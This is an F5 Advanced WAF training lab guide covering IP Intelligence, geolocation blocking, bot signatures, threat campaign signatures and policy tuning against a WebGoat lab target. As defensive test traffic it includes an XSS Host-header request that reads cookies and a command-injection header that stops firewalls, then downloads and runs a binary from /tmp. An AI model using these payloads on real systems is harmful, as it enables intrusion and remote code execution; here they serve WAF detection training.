# WAF - Getting started with WAF, Bot Detection and Threat Campaigns

[Original Lab Guide](https://clouddocs.f5.com/training/community/waf/html/waf141/labinfo/labinfo.html)

This class will focus on a best practice approach to getting started with F5 WAF and application security. This introductory class will give you guidance on deploying WAF services in a successive fashion. This 141 class focuses entirely on the negative security model aspects of WAF configuration.  
This is the 1st class in a three part lab series (141,241,341) based on: [Succeeding with Application Security](https://support.f5.com/csp/article/K07359270) which closely maps to this visualization of layered Application Security.

![img_class1_module1_animated_1](https://user-images.githubusercontent.com/51786870/210351695-bfae4cfd-0092-4e85-ad00-0083aac231d3.gif)

![2019-12-27 10_26_46-Zoom Meeting ID_ 441-307-163](https://user-images.githubusercontent.com/51786870/210351612-39a2898e-5cea-4064-b29f-a3b2fa43f4c4.png)

![image](https://user-images.githubusercontent.com/38420010/119345353-0da70580-bc99-11eb-94fe-59eabaf3c240.png)

## Lab Environment & Topology

`All work is done from the Linux Client, which can be accessed via RDP (Remote Desktop Client) or SSH. No installation or interaction with your local system is required.`

### Environment
  
Linux Client:  
  
  * BURP Community Edition - Packet Crafting
  * curl - command line webclient. Very useful for debugging and request crafting
  * Postman - API Development and request crafting
  
Linux server:  
  
  * WebGoat - deliberately insecure application that allows interested developers just like you to test vulnerabilities commonly found in Java-based applications

### Lab Topology
  
The network topology implemented for this lab is very simple. The following components have been included in your lab environment:

1 x Ubuntu Linux 20.04 client.  
1 x F5 BIG-IP VE (v16.0.1) running Advanced WAF with IP Intelligence & Threat Campaign Subscription Services.  
1 x Ubuntu Linux 20.04 server.  

# Module 1: IP Intelligence
Expected time to complete: 30 minutes


## Exercise 1.1: IP Intelligence Policies
### Objective

  * Configure Global IPI Profile & Logging
  * Review Global IPI Logs
  * Configure Custom Category and add an IP
  * Create your first WAF Policy and implement IPI w/ XFF inspection
  * Estimated time for completion: 30 minutes.

### Create Your 1st L3 IPI Policy
An IPI policy can be created and applied globally, at the virtual server (VS) level or within the WAF policy itself. We will follow security best-practice by applying IPI via a Global Policy to secure Layer 3 device-wide and within the Layer 7 WAF policy to protect the App by inspecting the HTTP X-Forwarded-For Header.  
![image](https://user-images.githubusercontent.com/38420010/119348500-3e893980-bc9d-11eb-8836-e57471dc73a8.png)

In this first lab, we will start by enabling a Global IPI Policy; much like you would do, as a day 1 task for your WAF:  
  
1. RDP to the Linux Client by choosing the RDP access method from your UDF environment page. You will be presented with the following prompt where you will enter the password only. Please use f5student username:

![image](https://user-images.githubusercontent.com/38420010/119348695-83ad6b80-bc9d-11eb-84a6-ad49b8747f0c.png)

2. Once logged in, launch Chrome Browser. You can double-click the icon or right click and choose execute but do not click multiple times. It does take a few moments for the browser to launch the first time.
3. Click the bigip01 bookmark and login to TMUI. It is normal to see a certificate warning that you can safely click through. Or you can use TMUI access via UDF.
4. On the Main tab, click Local Traffic > Virtual Servers and you will see the Virtual Servers that have been pre-configured for your lab. Essentially, these are the listening IP’s that receive requests for your application and proxy the requests to the backend “real” servers.

![image](https://user-images.githubusercontent.com/38420010/119349079-020a0d80-bc9e-11eb-91ed-d77da464c136.png)

  * **insecureApp1_vs** - Main Site - Status of green indicates a healthy backend pool of real servers
  * **security-testing-overlay-vs** - Will be used later to send spoofed traffic to the main site

5. On the Main tab, click Security > Network Firewall > IP Intelligence > Policies.
![image](https://user-images.githubusercontent.com/38420010/119349565-94121600-bc9e-11eb-9588-d95a3e714f33.png)

6. Click on the **Create** button.
7. For the name: **global_ipi**
8. Under **IP Intelligence Policy Properties** For the Default Log Action choose **yes** to **Log Category Matches.**
9. Browse to the inline Help tab at the top left of the GUI and examine the Default Log Action settings. Inline help is very useful when navigating the myriad of options available within any configuration screen.
10. To the right of the screen, click **Add** under the categories section.
11. Repeat this process and add the following additional categories: **phishing, scanners, spam_sources, & denial_of_service**. Outside of this lab, you would want to enable additional categories for protection.

![image](https://user-images.githubusercontent.com/38420010/119351114-69c15800-bca0-11eb-9264-d5ebeeca6c1e.png)

12. Commit the Changes to the System.
13. Under **Global Policy Assignment > IP Intelligence Policy** click on the dropdown and select the **global_ipi** policy and click Update.

### Setup Logging for Global IPI
1. In the upper left of the GUI under the **Main** tab, navigate to **Security > Event Logs > Logging Profiles** and click on **global-network**
2. Under the Network Firewall section configure the IP Intelligence publisher to use **local-db-publisher**
3. Check **Log GEO Events**
4. Click **Update**
![image](https://user-images.githubusercontent.com/38420010/119351448-bf960000-bca0-11eb-8704-5fd25bfb1f29.png)

### Test
1. On the Linux Client, open a terminal and **cd** to **Agility2020wafTools**
2. Run the following command to send some traffic to the site: **./ipi_tester**
`The script should continue to run for the remainder of Lab 1 & 2. Do NOT stop the script.`
3. Navigate to **Security > Event Logs > Network > Ip Intelligence** and review the entries. Notice the Geolocation Data as well as the Black List Class to the right of the log screen.

![image](https://user-images.githubusercontent.com/38420010/119351937-5b277080-bca1-11eb-882e-bb0d893f125b.png)

### Create Custom Category
1. Navigate to: **Security > Network Firewall > IP Intelligence > Blacklist Categories** and click **Create**.
2. Name: **my_bad_ips** with a match type of **Source**
3. Click **Finished**
4. Click the checkbox next to the name **my_bad_ips** and then at the bottom of the GUI, click **Add To Category**.
![image](https://user-images.githubusercontent.com/38420010/119352108-8d38d280-bca1-11eb-8734-52f48cb89621.png)
5. Enter the ip address: **134.119.218.243** or any of the other malicious IP’s showing up in the IP Intelligence logs, and set the seconds to **3600** (1 hour)
6. Click **Insert Entry**
7. Navigate to **Security > Network Firewall > IP Intelligence > Policies** and click **global_ipi**
8. Under **Categories** click **Add** and select your new custom category **my_bad_ips** from the drop-down. Click **Done Editing** and **Commit Changes to System**.
![image](https://user-images.githubusercontent.com/38420010/119352376-e6086b00-bca1-11eb-8c5a-8213f0ea3e55.png)
9. Navigate back to **Security > Event Logs > Network > Ip Intelligence** and review the entries under the column **Black List Class**. You will see entries for your custom category **my_bad_ips**.
![image](https://user-images.githubusercontent.com/38420010/119352409-f1f42d00-bca1-11eb-9885-2f5c43833c35.png)

**This concludes the Layer 3 IPI policy lab section.**  
  
**To recap, you have just configured a Global IP Intelligence policy and added a custom category.
This policy is inspecting Layer 3 only and is a best-practice first step to securing your Application traffic.**  
  
**We will now configure a Layer 7 WAF policy to inspect the X-Forwarded-For HTTP Header.**

### Create your WAF Policy
1. Navigate to **Security > Application Security > Security Policies** and click the Plus (+) button.
2. Name the policy: **webgoat_waf**
3. Select Policy Template: **Rapid Deployment Policy** (accept the popup)
4. Select Virtual Server: **insecureApp1_vs**
5. Logging Profiles: **Log all requests**
6. Notice that the Enforcement Mode is already in **Transparent Mode** and Signature Staging is **Enabled**
7. Click **Save**.
![image](https://user-images.githubusercontent.com/38420010/119353162-d76e8380-bca2-11eb-90bb-0daf3cd54a9a.png)

### Configure L7 IPI
1. Navigate to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **IP Addresses and Geolocations** section.
`These are the settings that govern what happens when a violation occurs such as Alarm and Block. We will cover these concepts later in the lab but for now the policy is still transparent so the blocking setting has no effect.`
![image](https://user-images.githubusercontent.com/38420010/119355305-64b2d780-bca5-11eb-8102-9f4e614507e7.png)
2. Navigate to **Security > Application Security > IP Addresses > IP Intelligence** and enable **IP Intelligence** by checking the box.
3. Notice at the top left drop-down that you are working within the webgoat_waf policy context. Enable **Alarm** and **Block** for each category.
![image](https://user-images.githubusercontent.com/38420010/119355409-84e29680-bca5-11eb-8572-5f8809e3ae8e.png)
4. Click **Save** and **Apply Policy**. You will get an “Are you sure” popup that you can banish by clicking **Do not ask for this confirmation again**.
5. Enable XFF inspection in the WAF policy by going to **Security > Application Security > Security Policies > Policies List** > and click on webgoat_waf policy.
6. Finally, scroll down under **General Settings** and click **Enabled** under **Trust XFF Header**.
7. Click **Save** and **Apply Policy**

### Test XFF Inspection
1. Open a new terminal or terminal tab on the Client (the ipi_tester script should still be running) and run the following command to insert a malicious IP into the XFF Header:

```bash
curl -H "X-Forwarded-For: 134.119.218.243" -k https://10.1.10.145/xff-test
```
If that IP has rotated out of the malicious DB, you can try one of these alternates:
* 80.191.169.66 - Spam Source
* 85.185.152.146 - Spam Source
* 220.169.127.172 - Scanner
* 222.74.73.202 - Scanner
* 62.149.29.36 - Spam Source
* 82.200.247.241 - Phishing
* 134.119.219.93 - Spam Source
* 218.17.228.102 - Spam Source
* 220.169.127.172 - Scanner

2. Navigate to **Security > Event Logs > Application > Requests** and review the entries. You should see a Sev3 Alert for the attempted access to uri: **/xff-test** from a malicious IP.
![image](https://user-images.githubusercontent.com/38420010/119356456-bb6ce100-bca6-11eb-91e7-316e32571e48.png)

3. In the violation details you can see the entire request details including the XFF Header even though this site was using strong TLS for encryption.

`Attackers often use proxies to add in source IP randomness. Headers such as XFF are used to track the original source IP so the packets can be returned. In this example the HTTP request was sent from a malicious IP but through a proxy that was not known to be malicious. The request passed right through our Global Layer 3 IPI policy but was picked up at Layer 7 due to the WAF’s capabilities. This demonstrates the importance of implementing security in layers.`

## Exercise 1.2: Add a Geolocation Policy
Another practical control to implement early on in your WAF deployment is Geolocation blocking or fencing. If we know that our application is only supposed to be accessed from certain countries or not accessed from others, now is the time to get that configured and enforced.

`Much like our Layer 7 IPI Policy, with Advanced WAF the Geolocation logic happens at the policy level. You may have many policies each with their own unique configuration per application or you may use a parent policy that has baseline settings.`

### Geolocation
**For demonstration purposes you will now disable the Layer 3 Global IPI policy to ensure Layer 7 Geolocation & IPI events occur.**
1. Browse to **Security > Network Firewall > IP Intelligence > Policies** and set the Global Policy Assignment to **None** and click **Update**.
2. Open **Security > Application Security > Geolocation Enforcement**
3. Select all Geolocations **except the United States and N/A** and move them to Disallowed Geolocations. **Save** and then **Apply Policy**.
![image](https://user-images.githubusercontent.com/38420010/119356800-1ef70e80-bca7-11eb-8486-093801f0641e.png)
`N/A covers all RFC1918 private addresses. If you aren’t dropping them at your border router (layer 3), you may decide to geo-enforce at ASM (Layer 7) if no private IP’s will be accessing the site.`
4. Navigate to **Security > Event Logs > Application > Requests** and review the entries in the event log that contain both IPI and Geolocation violations.
![image](https://user-images.githubusercontent.com/38420010/119356892-3afab000-bca7-11eb-921e-0ff198b705b8.png)
`You can also perform Geolocation Enforcement with LTM policies attached to Virtual Servers even if you are only licensed for Advanced WAF. Blocking decisions made here would not be reflected in the Application Requests WAF Log but can be still be logged.`


**This completes Exercise 1.2

Congratulations! You have just completed Lab 1 by implementing an IPI policy globally at Layer 3 and at Layer 7 via WAF policy for a specific application. Next you added Geolocation Enforcement to the policy and learned that this can be done via WAF policy or LTM policy. This follows our best-practice guidance for getting started with Application Security.**

# Module 2: Bot Defense
Expected time to complete: 20 minutes

## Exercise 2.1: Bot Defense with Signatures

The next logical step in our configuration is to deal with automated traffic. While Advanced WAF has some deep Bot Defense capabilities, we will start with Bot Signatures. A good goal during your initial deployment would be to get transparent BOT profiles deployed across your various application Virtual Servers so you can start to analyze your “normal” loads of automated traffic. This can be very surprising to an organization or a developer that thought they had a lot more “real users”.

### Objective
  * Create a Bot Defense logging profile
  * Create and apply a transparent Bot Defense Profile with Signatures
  * Test and verify logs
  * Add a signature to the whitelist
  * Estimated time for completion: **20 minutes**

### Create Logging Profile
1. Navigate to **Security > Event Logs > Logging Profiles** and click **Create** to a new Logging Profile with the settings shown in the screenshot below. Click **Create**.
![image](https://user-images.githubusercontent.com/38420010/119357266-a775af00-bca7-11eb-9473-232baace0399.png)
2. Navigate to **Security > Bot Defense > Bot Defense Profiles** and click **Create**.
3. Name: **webgoat_bot**
4. Profile Template: **Relaxed**
5. Click the Learn more link to see an explanation of the options. These will be explored further in the 241 lab but for now we are going with **Relaxed** aka **Challenge-Free Verification**.
![image](https://user-images.githubusercontent.com/38420010/119357409-d429c680-bca7-11eb-8889-27572035d2e2.png)
6. Click on the **Bot Mitigation Settings** tab and review the default configuration.
7. Click on the **Signature Enforcement** tab and review the signatures and staging status.
8. Click **Save**.

### Apply the Policy and Logging Profile
1. Navigate to **Local Traffic > Virtual Servers** click on **insecureApp1_vs** then go to the **Security Tab > Policies** (top middle of screen).
`To clearly demonstrate just the Bot Defense profile, please disable all security policy on the virtual server. The ipi_tester script should still be running!`
2. Navigate to **Local Traffic > Virtual Servers > insecureApp1_vs > Security > Policies** and disable the **Application Security Policy** and **enable the Bot Defense Profile** and **Bot_Log Profile**.
3. Click **Update**

![image](https://user-images.githubusercontent.com/38420010/119358317-c759a280-bca8-11eb-9725-f60b6ddbe1c4.png)

4. Navigate to **Security > Event Logs > Bot Defense > Bot Requests** and review the event logs. Notice curl (the bot being used in our ipi_tester script) is an untrusted bot in the HTTP Library category of Bots.

![image](https://user-images.githubusercontent.com/38420010/119358572-0556c680-bca9-11eb-812f-248f097248fb.png)

5. On the top middle of the screen under the **Bot Defense** Tab, click on **Bot Traffic** for a global view of all Bot Traffic. In this lab we only have one site configured.

![image](https://user-images.githubusercontent.com/38420010/119358885-55ce2400-bca9-11eb-920e-8bfd37fee102.png)

6. Click on the **insecurApp1_vs** Virtual Server and explore the analytics available under **View Detected Bots** at the bottom of the screen.

![image](https://user-images.githubusercontent.com/38420010/119358826-4bac2580-bca9-11eb-903c-338599a74cf2.png)

### Whitelisting a Bot & Demonstrating Rate-Limiting¶
1. Navigate to **Security > Bot Defense > Bot Defense Profiles > juiceshop_bot > Bot Mitigation Settings**
2. Under **Mitigation Settings** change Unknown Bots to **Rate Limit** with a setting of **5** TPS. **5** is a very aggressive rate-limit and used for demo purposes in this lab.
`In the “real world” you will need to set this to a value that makes sense for your application or environment to ensure the logs do not become overwhelming. If you don’t know, it’s usually pretty safe to start with the default of 30.`
3. Under **Mitigation Settings Exceptions** click **Add Exceptions** and search for curl and click **Add**.
![image](https://user-images.githubusercontent.com/38420010/119359128-95950b80-bca9-11eb-9ece-4c4fd8cf5bfd.png)
4. Change the Mitigation Setting to **None** and then **Save** the profile.
![image](https://user-images.githubusercontent.com/38420010/119359150-9a59bf80-bca9-11eb-8434-04d89bd71af8.png)
5. Navigate to **Security > Event Logs > Bot Defense > Bot Requests** and review the event logs.
6. Notice the whitelisted bot’s class was changed to unknown and we set curl to not alarm but the requests are still being alarmed. What gives?
![image](https://user-images.githubusercontent.com/38420010/119359260-ba897e80-bca9-11eb-9779-90a60e904923.png)
7. Click the down arrow under **Mitigation Action** and note the reason for the alarm.
`Even though we have whitelisted this bot we can still ensure that it is rate-limited to prevent stress on the application and any violations to that rate-limit will be Alarmed. This bot is currently violating the rate-limit of 5 TPS.`

![image](https://user-images.githubusercontent.com/38420010/119359356-d1c86c00-bca9-11eb-8033-94a3164e3879.png)

### Testing Additional User-Agents
1. Navigate to **Local Traffic > Virtual Servers > Virtual Server List > security-testing-overlay-vs > Resources** tab and under **iRules** click **Manage** and add the **ua_tester** iRule and click **Finished**.
![image](https://user-images.githubusercontent.com/38420010/119359583-12c08080-bcaa-11eb-963f-6c424263b000.png)
`What you just added is an iRule that inserts poorly spoofed User-Agents. Our ipi_tester script has been sending traffic through this Virtual Server all along and spoofing source IP’s to the main site via the ipi_tester iRule.`
2. Navigate to **Security > Event Logs > Bot Defense > Bot Requests** and review the event logs.
3. All the **Unknown** bots are getting rate-limited and the known browsers that do not match the appropriate signatures, such as the spoofed Safari request in this example, are being marked as **Suspicious or Malicious**.

**This completes Lab 2**
  
**Congratulations! You have just completed Lab 2 by implementing a signature based bot profile. Implementing bot signatures is the bare minimum for bot mitigation and not a comprehensive security strategy. This is a excellent step in getting started with WAF and will provide actionable information on automated traffic. You can use this information to take next steps such as implementing challenges and blocking mode. At a very minimum, share this information with your Application teams. Automated traffic can negatively affect the bottom line especially in cloud environments where it’s pay to play. See our 241 class on Elevated WAF Security for more info on advanced bot mitigation techniques.**

# Module 3: Threat Campaigns¶
Expected time to complete: 20 minutes

## Exercise 3.1: Threat Campaigns
Threat Campaign signatures are subscription based and sourced from a variety of threat intel sources based on real world campaigns to attack and/or take over resources. Attackers are constantly looking for ways to exploit the latest vulnerabilities and/or new ways to exploit old vulnerabilities. F5’s Threat Research team is constantly monitoring malicious activity around the globe and creating signatures specific to these exploits. These Threat Campaign signatures are based on current “in-the-wild” attacks. Threat Campaign signatures contain contextual information about the nature and purpose of the attack.

As an example, a normal WAF signature might tell you that SQL injection was attempted. A Threat Campaign signature will tell you that a known threat actor used a specific exploit of the latest Apache Struts vulnerability (CVE -xxxx) in an attempt to deploy ransomware for cryptomining software.

### Objective
  * Prep the Virtual Server
  * Review TC Signatures
  * Review Learning/Blocking settings and Staging Concept
  * Launch Attack
  * Test and verify logs
  * Estimated time for completion: 20 minutes

### Prep the Virtual Server
These steps are necessary for this demonstration. In the “real world” having the Bot Defense Profile pick up this type of attack coming from a tool, not a browser, would be preferred, going back to the layered security approach.

1. Navigate to **Local Traffic > Virtual Servers > Virtual Server List > insecureApp1_vs > Security > Policies**.
2. Enable the **Application Security Policy: webgoat_waf**. Threat Campaign Signatures are part of your WAF policy.
3. **Disable the Bot Defense Profile**. We are removing the bot profile since we will be using a “Bot” to test the Threat Campaign signatures.
4. **Remove the Bot_Log profile** and click **Update**. Your virtual should look like this:

![image](https://user-images.githubusercontent.com/38420010/119360891-5ebff500-bcab-11eb-9921-6a15bd53f2e9.png)

### Review TC Signatures
1. Navigate to **System > Software Management > Live Update > Threat Campaigns**. DO NOT update the system but note the Installation History. You can also view the Bot Signatures and other signature packages that are currently installed or pending.
`Without an Advanced WAF license and Threat Campaign Subscription you will NOT get Live Updates for Bot Signatures.`
2. Navigate to **Security > Options > Application Security > Threat Campaigns** and review some of the signatures and information about them.
3. Click on the **Apache Struts2 Jakarta Multipart Parser BillGates** signature and note the attack type as well as the CVE reference: **CVE-2017-5638**. You can click the CVE reference link for more information.
4. Click on the filter button and under the Reference field, type: **2020** and **Apply Filter** to search for all CVE’s related to 2020.
![image](https://user-images.githubusercontent.com/38420010/119361128-9b8bec00-bcab-11eb-8deb-56a7bb4d9672.png)

### Review TC Learning and Blocking Settings
1. Navigate to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Threat Campaigns** section.
2. Note that the system is set to **Alarm** and **Block** on signature matches. Remember, our policy is in transparent mode so the blocking setting will not have any effect.
![image](https://user-images.githubusercontent.com/38420010/119361221-b5c5ca00-bcab-11eb-96ba-d3be2be65fca.png)
`Staging and the Enforcement Readiness period means that when new signatures are downloaded, if staging is enabled, the system will wait until the enforement readiness period is over before it starts blocking. You will still see alarms during this period. Due to the high accuracy nature of Threat Campaign signatures, the default system configuration is to have Staging turned off so new signatures go into effect immediately.`


### Test TC Signatures and Review Logs
`Please ensure the ipi_tester script is not running in the terminal on the Linux Client. If it is, you can strop it with Ctrl+C`
1. From the Linux Client, confirm that the ipi_tester script is not running in the terminal and launch **Postman** from the Desktop. **It takes a few moments for Postman to launch**.
![image](https://user-images.githubusercontent.com/38420010/119361378-e1e14b00-bcab-11eb-9766-16f63afb8f1b.png)
2. You will see a collection called **Threat Campaigns** and within, an item called **test_req**. This simply tests that the site is responding.
3. Click on **test_req** and then click the blue **Send** button on the top right. If your output does not look like this, please let a lab instructor know.
![image](https://user-images.githubusercontent.com/38420010/119363569-3b4a7980-bcae-11eb-9a87-93defc9bb83e.png)
4. Click on the **Fortinet SSL VPN** attack and then click the blue **Send** button. Repeat this process for the **Oracle2** attack. Explore the http headers and bodies being sent. If your policy was in blocking mode you would receive a block page but since the policy is transparent, these attacks are making it through and the juiceshop page is returned.
5. Back in Advanced WAF, navigate to **Security > Event Logs > Application > Requests** and review the Sev5 events.
![image](https://user-images.githubusercontent.com/38420010/119363772-7a78ca80-bcae-11eb-890c-83f3eb1c8f17.png)
6. Click on the event for **/remotefgt_lang** and note the triggered violations. Click on **All Details** to the right of the screen to get more information. You can also click the **Open to new tab** icon in the top right to get an isolated view of this violation.
![image](https://user-images.githubusercontent.com/38420010/119363841-8ebcc780-bcae-11eb-8f2d-fc593edba67f.png)
7. When working in the WAF Requests event viewer, you can see exactly which Attack Signatures or Threat Campaigns were triggered under the **Violations** section. Click the **Numerical Value** under **Occurrences** for **Threat Campaign detected**.
![image](https://user-images.githubusercontent.com/38420010/119363924-a7c57880-bcae-11eb-9227-3dca7d61103a.png)
8. Notice that the there were actually 2 Threat Campaigns Signatures that triggered and you can see the Applied Blocking Setting of **Alarm**
9. Click the little blue info icon next to one of the Threat Campaign Signatures for more information.
![image](https://user-images.githubusercontent.com/38420010/119363967-b57afe00-bcae-11eb-8cc2-a589b7f81928.png)
10. Review the other alert that we generated from Postman and explore any additional Attack Signatures that were fired. In this instance, a Malformed XML Data signature that was enabled as part of our Rapid Deployment Policy also picked up the attack.
![image](https://user-images.githubusercontent.com/38420010/119364022-c461b080-bcae-11eb-9f6d-177b7995574f.png)
11. Navigate to **Security > Event Logs > Application > Event Correlation** and explore the Dashboard.
12. Click on the **Threat Campaign** incident and then click on **Export Incident** and review the generated report.

![image](https://user-images.githubusercontent.com/38420010/119364311-0ab70f80-bcaf-11eb-98e5-d3f1d3382548.png)

**This completes Lab 3**

**Congratulations! You just completed Lab 3 and have continued your introductory knowledge to Advanced WAF with Threat Campaign Signatures. These powerful and highly-accurate signatures are a great first step into enforcing blocking as they produce virtually no false positives.**

# Module 4: Transparent WAF Policy
Expected time to complete: 30 minutes

## Exercise 4.1: Transparent Policy
### Objective
We created a transparent policy way back in Lab 1 to configure Geolocation enforcement & Layer 7 XFF inspection for IPI. We then tested out the Threat Campaign signatures in Lab 3 and now we will explore and test some of the other components that should be in scope for enforcement early on in your WAF deployment.

  * Review Learning & Blocking & Policy Building Process settings
  * Implement HTTP Protocol Compliancy checks and test
  * Test with a HTTP Protocol violation plus XSS attack
  * Enable Server Technologies & Attack Signatures
  * Review Reporting
  * Estimated time for completion 30 minutes.

### Learning & Blocking
Recall from Lab 1, that we used the Rapid Deployment Policy template to create our policy and we deployed it in manual learning mode. This means as violations and/or false positives occur, the system will make suggestions to modify the policy. The admin will manually evaluate the suggestions and Approve, Ignore or Delete them.

1. Navigate to **Security > Application Security > Policy Building > Traffic Learning** and notice that there are no “learning suggestions” displayed yet. So far, all of our site traffic has been generated by a malicious script so now it’s time to generate some real user traffic.

2. In the Firefox browser open a new tab, click on the InsecureApp1 bookmark in the Bookmarks Toolbar. Click **Register new user**, create account and Browse around the site and perform several actions as a real user would.
3. Click back on the Advanced WAF GUI tab in your browser and refresh the traffic learning screen. If you navigated away or closed the tab, open a new one, login to Advanced WAF and go to: **Security > Application Security > Policy Building > Traffic Learning**.
4. You will see many Suggestions and a learning score that the system assigns based on how many times it has seen an occurence and from what source. You can **Accept, Delete, Ignore** or **Export** the suggestion.
`This is where it usually starts to get a little dicey for a first-time WAF admin. Always look very carefully at the suggested action before deciding on which action to take. It is also helpful to define a whitelist so that the policy can learn quicker and from known trusted sources. You generally do not want the system learning from random and/or hostile Internet traffic and making suggestions to relax the policy.`
5. Notice that most of the learning suggestions involve enabling various HTTP protocol Compliance Checks.
6. Find and select the suggestion for **Enable HTTP protocol compliance check - HTTP Check: No Host header in HTTP/1.1 request**.
7. Review the **Suggested Action** and click **Accept** and **Apply Policy**.
![image](https://user-images.githubusercontent.com/38420010/119366527-5c609980-bcb1-11eb-905c-b6cc4af0f8c9.png)
8. What just happened and how do you see what changed by who and when? Audit Log of course!
9. Go to **Security > Application Security > Audit > Log** and review the most recent actions. You can see who, what and when every component within a policy was modified. (This step is not necessary but meant to draw your attention to the audit log)
10. Click on the Element Name (blue hyperlink) **No Host header in HTTP/1.1** request This takes you to the Learning and Blocking Settings screen where the check was enabled.
![image](https://user-images.githubusercontent.com/38420010/119367381-2e2f8980-bcb2-11eb-9e3e-7d4ed4d810f7.png)
11 Notice that by default in the Rapid Deployment Policy, learning is enabled for most of the common HTTP Protocol compliancy checks. Also notice that the **Enable** checkbox next to **No Host header in HTTP/1.1** request is now checked.
![image](https://user-images.githubusercontent.com/38420010/119367463-44d5e080-bcb2-11eb-9622-6311a4ecb57c.png)
12. Uncheck the **Learn box** for this violation then **Save** and **Apply** policy.
13. Open a new Terminal and send the following request. This request is being sent without a host header and should now raise a violation in our Event Log rather than a learning suggestion.
```bash
curl -k -H 'Host:' https://10.1.10.145/
```
14. Review the **Alarmed request in Security > Event Logs > Application > Requests**.
![image](https://user-images.githubusercontent.com/38420010/119367829-a5fdb400-bcb2-11eb-8b84-5c5a283e63cc.png)
15. To review, you just took a learning suggestion and accepted it to enable a protocol compliancy check and then you disabled future learning suggestions for this event. Violations are now alarmed in the Event Logs.
16. Go back to**Security > Application Security > Policy Building > Traffic Learning** You would now typically go through and enable all of the checks that the policy is recommending regarding http protocol compliance and evasion technique detection.
`Remember that your policy is safely in transparent mode so accepting suggestions and enabling checks will only raise alarms and no blocking actions will occur. This is why it is very important to start off transparently until you fully understand the basics of managing a WAF policy.`


### Policy Building Process
One thing you can do to greatly increase the integrity of the learning suggestions is, define trusted IP’s. You can also tell the system to Only learn from trusted IP’s which is a very wise thing to do if you are developing policy on an app that is exposed to untrusted or Internet traffic.

1. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Policy Building Process** section at the bottom. Here you can see settings that this particular policy is using for learning. Notice that **Trusted IP Addresses List** is empty.
2. Click the little window/arrow icon next to **Trusted IP Addresses** List is empty.
3. This takes you to: **Security > Application Security > IP Addresses > IP Address Exceptions**. Click **Create**.
4. For IP Address: **10.0.0.0** and for Netmask: **255.0.0.0**. Check the box for **Policy Builder trusted IP** and click **Create** and **Apply Policy**.
![image](https://user-images.githubusercontent.com/38420010/119369870-f37b2080-bcb4-11eb-9ea0-2d0794b40455.png)
5. Navigate back to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Policy Building Process** section. Notice that our newly defined network is now a **Trusted IP**. This will greatly enhance the speed and quality of learning suggestions.
6. Change the view from Basic to Advanced and review all the fine-grained configurations for the **Policy Building Process**.
![image](https://user-images.githubusercontent.com/38420010/119369972-0beb3b00-bcb5-11eb-9cf4-c368a7172654.png)
**You now know how to define a trusted ip and configure the policy building process settings**

### Burp’ing the App
In this section we are going to use the free/community version of an excellent DAST tool; Burp. Unfortunately, the free version does not actually allow DAST but it is still an excellent tool for packet crafting and that’s exactly how we are going to use it.

### Accept the Remaining Learning Suggestions
Go to **Security > Application Security > Policy Building > Traffic Learning** and select all of the remaining suggestions and click **Accept > Accept suggestions** and then **Apply Policy**.
![image](https://user-images.githubusercontent.com/38420010/119370128-3ccb7000-bcb5-11eb-886a-9b2c805a0528.png)

### HTTP Compliancy Check - Bad Host Header Value
The **Bad Host Header Value** check is an HTTP Parser Attack and definitely something that should be implemented as part of **Good WAF Security**. It was included in the suggestions you just accepted.

**Risk**: If we allow bad host header values they can be used to Fuzz web servers and gather system information. Successful exploitation of this attack could allow for the execution of XSS arbitrary code.

1. Launch **Burp** from the Desktop. **Do Not click multiple times. It takes a few moments to load**.
![image](https://user-images.githubusercontent.com/38420010/119370368-7b612a80-bcb5-11eb-9e0a-9578472456e4.png)
2. **DO NOT update.**
3. Choose **Temporary Project** and click **Next** and then click **Start Burp**.
4. Click the **Repeater** tab and paste in the following http request (Replace the username and password with credentials you have created.) and click **Send**.
5. A popup window will appear to configure the target details. For host use: **10.1.10.145**. For port use: **443**. **Check the Use HTTPS box**.
6. Click **Send**
**XSS in HOST Header**  

```
POST https://10.1.10.145/WebGoat/login HTTP/1.1
User-Agent: BabyYoda
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Host: <script>alert(document.cookie);</script>

username=f5student&password=[password]
```

![image](https://user-images.githubusercontent.com/38420010/119371000-3ee1fe80-bcb6-11eb-9028-904c31ef3a4f.png)
7. Back in Advanced WAF, browse to **Security > Event Logs > Application > Requests** and review the alert for this Sev5 attack. Note the alert severity is much higher (5) for this attack type due to several violations occuring including HTTP protocol Violations and several XSS signatures.
8. Review all the details and then click the 3 under the **Attack Signature Detected** violation to see all of the staged XSS Attack Signatures that were triggered.
![image](https://user-images.githubusercontent.com/38420010/119371172-6fc23380-bcb6-11eb-8c36-29d482684897.png)

### Server Technologies & Attack Signatures
In this final exercise we will examine server technologies which allow you to automatically discover server-side frameworks, web servers and operating systems. This feature helps when the backend technologies are not well known or communicated from the Dev team.

1. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures**
2. Review the Attack Signatures that were applied during policy creation from back in Lab 1. **Generic Detection Signatures (High/Medium Accuracy)**. Notice that they are set to **Learn/Alarm/Block** and **Staging** is enabled.
3. Locate Server Technologies and expand the option. Click **Enable Server Technology Detection**, click **Save** and then click the **New Window Icon** next to Server Technologies.
![image](https://user-images.githubusercontent.com/38420010/119371333-997b5a80-bcb6-11eb-9072-b1a7a38b73e5.png)
4. Scroll down to Advanced Settings > Server Technologies and click in the box. Search for Linux since we know the server is running Linux. The system will display a box describing which new signature sets will be applied. Click Confirm.
5. Make sure to **Save** and **Apply Policy**.
6. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures** and notice the new Unix/Linux Server Technology signature sets that were added to the policy.

![image](https://user-images.githubusercontent.com/38420010/119371527-d21b3400-bcb6-11eb-8cc0-b09e24f21c99.png)

### Framework Attacks

1. Back in BURP navigate to the repeater tab and adjust the payload to the following and hit Send. Replace password with the password you’ve been using all along

**Framework Attack**
```
POST https://10.1.10.145/WebGoat/login HTTP/1.1
User-Agent: ImperialProbeDroid
Pragma: no-cache
Cache-Control: no-cache
Content-Type: /etc/init.d/iptables stop; service iptables stop; SuSEfirewall2 stop; reSuSEfirewall2 stop; cd /tmp; wget -c https://10.1.10.145:443/7; chmod 777 7; ./7;
Content-Length: 38
Host: DarthMaul

username=f5student&password=[password]
```

2. Browse to **Security > Event Logs > Application > Requests** and look for the most recent Sev5 Event. Select the event, review the violations and click the 2 under Occurrences for the Attack signature detected violation.

